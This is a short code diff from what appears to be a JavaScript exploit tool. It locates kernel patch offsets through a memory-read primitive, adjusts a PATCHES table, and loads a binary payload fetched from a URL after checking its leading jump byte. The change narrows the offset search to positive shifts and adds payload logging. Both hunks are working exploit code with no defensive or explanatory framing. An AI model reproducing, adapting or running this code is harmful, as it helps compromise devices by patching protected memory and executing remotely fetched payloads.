@@ -1310,21 +1310,13 @@ async function attempt(ctx, opts) {
       if (expect1 < 0) continue;
       if (cur && cur[0] === expect1) continue;
 
-      let best = null;
+      let best = -1;
       for (let s = 0; s < SHIFTS.length; s++) {
         const t = k.read(kat(off + SHIFTS[s]), 1);
         if (t && t[0] === expect1) { best = SHIFTS[s]; break; }
       }
-      if (best === null) {
-        for (let d = -0x800; d <= 0x800; d += 16) {
-          if (d === 0) continue;
-          const t = k.read(kat(off + d), 1);
-          if (t && t[0] === expect1) { best = d; break; }
-        }
-      }
-      if (best !== null) {
-        say("[7b] " + PATCHES[i][2] + " shifted " + (best > 0 ? "+" : "") + best
-            + " -> 0x" + (off + best).toString(16));
+      if (best > 0) {
+        say("[7b] " + PATCHES[i][2] + " shifted +" + best + " -> 0x" + (off + best).toString(16));
         PATCHES[i][0] = off + best;
         adj++;
       } else {
@@ -1553,6 +1545,7 @@ async function loadPayload(url, vorab) {
     blob = await fetchBytes(url, "p");
     if (blob === null) return false;
   }
+  say("[p] got " + blob.length + " bytes, first=0x" + (blob[0] || 0).toString(16));
 
   if (!blob.length) { say("[p] " + url + " is empty"); return false; }
   if (blob[0] !== 0xe9) {
